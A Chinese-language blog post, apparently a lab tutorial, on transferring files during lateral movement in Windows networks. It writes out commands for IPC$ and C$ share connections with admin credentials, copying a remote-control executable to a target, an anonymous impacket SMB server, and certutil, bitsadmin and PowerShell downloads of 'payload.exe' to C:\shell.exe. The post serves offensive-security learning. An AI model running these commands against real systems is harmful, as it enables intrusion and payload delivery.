---
title: "横向移动中的文件传输"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 横向移动中的文件传输

横向移动之前，需要对攻击载荷和文件等的传输制定方案

### 通过网络共享

可以实现局域网之间的网络共享，通过提供有效的用户凭据，用户可以实现两台主机之间的文件传输

获取windows默认开启的网络共享：

~~~cmd
net share
~~~

![image-20241021142048107](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021142049383-65256384.png)

C$为C盘共享，ADMIN$为系统目录共享，IPC$共享需要提供可信任的用户名和口令来建立安全的传输通道

实战通常选择IPC连接，该方法除了文件共享还能实现创建计划任务或系统服务等，而建立IPC连接的前提是：

* 远程主机开启了IPC连接
* 远程主机139或445端口开放

建立IPC连接：

~~~cmd
net use \\192.168.111.131\IPC$ "Admin123456" /user:"yuy0ung\administrator"
~~~

![image-20241021144152556](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021144154440-490057327.png)

列出远程主机C盘共享文件：

~~~cmd
dir \\192.168.111.131\C$
~~~

![image-20241021144241792](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021144243429-619286692.png)

使用copy可以在两台主机之间相互复制文件，这里我向目标主机上传远控exe：
~~~cmd
copy artifact.exe \\192.168.111.131\C$
~~~

![image-20241021144539088](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021144540829-359853067.png)

建立其他共享连接命令类似如C$连接：

~~~cmd
net use \\192.168.111.131\C$ "Admin123456" /user:"yuy0ung\Administrator"
~~~

![image-20241021145451673](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021145453410-380784067.png)

### 搭建SMB服务器

可以尝试在公网vps或受控内网主机上搭建SMB服务器，将需要传输的文件放入SMB服务器的共享目录并指定UNC路径，让横向移动的主机能够远程加载共享文件，有两点需要注意：

* 要使用SMB匿名共享
* 该SMB服务器能够被目标主机访问

在linux系统上可以通过impacket项目中的smbserver.py搭建SMB服务器

搭建一个名为yuy0ungsmb，共享目录指向`/root/share`的SMB匿名共享：

~~~sh
mkdir /root/share

python smbserver.py yuy0ungsmb /root/share -smb2support
# 或者
impacket-smbserver evilsmb /root/share -smb2support
~~~

![image-20241025175215021](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025175218050-202283514.png)

从 SMB server 下载文件

```html
copy \\192.168.111.128\yuy0ungsmb\file.exe file.exe
```

上传文件到 SMB server

```html
net use x: \\192.168.111.128\yuy0ungsmb
copy file.txt x:

net use x: /delete
```

### 使用 windows自带工具

#### Certutil

certutil用于管理windows证书并作为证书服务的一部分安装，其提供了从网络中下载文件的功能：

~~~cmd
certutil -urlcache -split -f http://192.168.111.1/payload.exe C:\shell.exe
~~~

不知道为什么我这里会报错显示拒绝访问

#### BITSAdmin

win7以后版本系统自带

创建一个名为test的任务，下载payload.exe到本地，并将其保存到C:\shell.exe：
~~~cmd
bitsadmin /transfer test http://192.168.111.1/payload.exe C:\shell.exe
~~~

![image-20241021204017457](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021204022600-1076476930.png)

#### powershell

powershell也可以实现文件下载：

~~~powershell
Invoke-WebRequest -Uri http://192.168.111.1/payload.exe -OutFile C:\shell.exe
~~~

![image-20241021204454132](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241021204501220-1898503546.png)

命令很多，自己选择即可，这里也只列出了几条

